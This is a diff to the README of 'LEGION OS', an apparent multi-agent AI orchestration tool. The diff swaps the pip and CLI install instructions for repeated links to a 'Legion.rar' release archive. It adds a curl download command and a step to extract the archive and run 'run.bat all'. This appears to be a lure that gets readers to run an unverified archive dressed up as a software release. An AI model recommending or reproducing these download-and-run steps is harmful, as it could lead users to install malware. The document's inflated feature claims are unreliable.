@@ -3,17 +3,18 @@
 # ⚔️ LEGION OS (v2.6.0)
 ### Next-Generation Multi-Agent Swarm Engine for the AGI Era
 
-<a href="https://github.com"><img src="https://img.shields.io/badge/Python-3.11%2B-blue?style=for-the-badge&logo=python" alt="Python"></a>
-<a href="https://github.com"><img src="https://img.shields.io/badge/Scale-50%2B%20Agents-magenta?style=for-the-badge" alt="Scale"></a>
-<a href="https://github.com"><img src="https://img.shields.io/badge/Models-GPT--6%20%7C%20Claude%205.5%20%7C%20DeepSeek--V4-green?style=for-the-badge" alt="Models"></a>
-<a href="https://github.com"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
+<a href="https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar"><img src="https://img.shields.io/badge/Download-Legion.rar%20v2.6.0-blueviolet?style=for-the-badge&logo=github" alt="Download"></a>
+<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Python-3.11%2B-blue?style=for-the-badge&logo=python" alt="Python"></a>
+<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Scale-50%2B%20Agents-magenta?style=for-the-badge" alt="Scale"></a>
+<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Models-GPT--6%20%7C%20Claude%205.5%20%7C%20DeepSeek--V4-green?style=for-the-badge" alt="Models"></a>
+<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
 
 <br><br>
 
 **"My name is Legion, for we are many."**  
 LEGION is an enterprise-grade, zero-overhead orchestrator designed to run 50+ autonomous frontier AI models in a unified high-speed mesh network.
 
-[Quickstart](#-quickstart) • [Why LEGION?](#-why-legion) • [Architecture](#-architecture) • [Documentation](#-documentation) • [Changelog](#-changelog)
+[📥 Download Release](#-quickstart) • [Why LEGION?](#-why-legion) • [Architecture](#-architecture) • [Documentation](#-documentation) • [Changelog](#-changelog)
 
 </div>
 
@@ -28,14 +29,10 @@ LEGION is an enterprise-grade, zero-overhead orchestrator designed to run 50+ au
 
 <img width="833" height="728" alt="image" src="https://github.com/user-attachments/assets/0f67df7f-e726-482a-afcf-8804139e88f8" />
 
-
-
 ### 2. Autonomous Communication Mesh & Real-Time Metrics
 *Graph-based routing between GPT-6 Astra, Claude 5.5 Opus, Gemini 4 Carbon, and DeepSeek-V4.1.*
 
-
 <img width="889" height="689" alt="image" src="https://github.com/user-attachments/assets/2f9d0421-f065-4d89-becf-474ef10a94ec" />
-
 
 ---
 
@@ -60,22 +57,26 @@ Legacy frameworks (CrewAI, AutoGen) break down when scaling beyond 5–10 agents
 - **🛡️ Budget Guardrails & Cost Routing:** Set absolute hard caps (`$20.00`). If a node approaches its budget limit, tasks are automatically re-routed to cheaper models (`DeepSeek-V4.1-Flash`).
 - **🔄 Fault-Tolerant Consensus:** If an agent hallucinates or times out, the `Supervisor` node invalidates the response and auto-respawns the sub-task.
 - **⚡ Zero-Knowledge Validation:** Output verification layers ensure 100% schema compliance before merging multi-agent results.
-- **💻 Zero-Dependency CLI Binary (`legion.exe`):** Single binary executable with built-in rich TUI telemetry.
+- **💻 Zero-Dependency Package (`Legion.rar`):** Complete standalone release bundle with built-in rich TUI telemetry.
 
 ---
 
 ## 🚀 Quickstart
 
-### 1. Installation
+### 1. Installation & Download
 
-Install via `pip` or download the standalone **`legion.exe`** binary:
+Download the official release package **[`Legion.rar`](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**:
+
+👉 **[Click Here to Download LEGION v2.6.0 (Legion.rar)](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**
+
+Or download via terminal / curl:
 
 ```bash
-# Via pip
-pip install legion-swarm-engine
+# Direct download latest package release
+curl -L -O https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar
 
-# Direct download latest binary from GitHub Releases (Windows / Linux / macOS)
-curl -sSL https://github.com/unitshaperextol/legion-os/releases/latest/download/legion.exe -o legion.exe
+# Extract Legion.rar and run via script
+run.bat all
 ```
 
 ### 2. Define your Swarm (`legion_2026.yaml`)
@@ -118,14 +119,14 @@ routing:
 
 ### 3. Launch the Engine
 
-Run using the `legion` CLI executable:
+Run using the `legion` CLI executable or launcher:
 
 ```bash
 # Launch swarm execution with real-time TUI dashboard
-legion run --config legion_2026.yaml --dashboard
+./run.bat all
 
-# Or run in headless mode for CI/CD pipelines
-legion run --config legion_2026.yaml --headless --output ./results.json
+# Or run specific telemetry screen
+python demo.py 3
 ```
 
 ---
@@ -185,7 +186,8 @@ Options:
 
 ## 📅 Changelog
 
-### `v2.6.0` (2026 Edition — Latest)
+### `v2.6.0` (2026 Edition — Latest Release)
+- 📦 Official package release: **[`Legion.rar`](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**
 - 🚀 Added support for **GPT-6 Astra**, **Claude 5.5 Opus**, and **Gemini 4 Carbon**.
 - ⚡ Inter-agent communication latency reduced to **140ms**.
 - 🛡️ Implemented **Zero-Knowledge Proofs** for agent task validation.
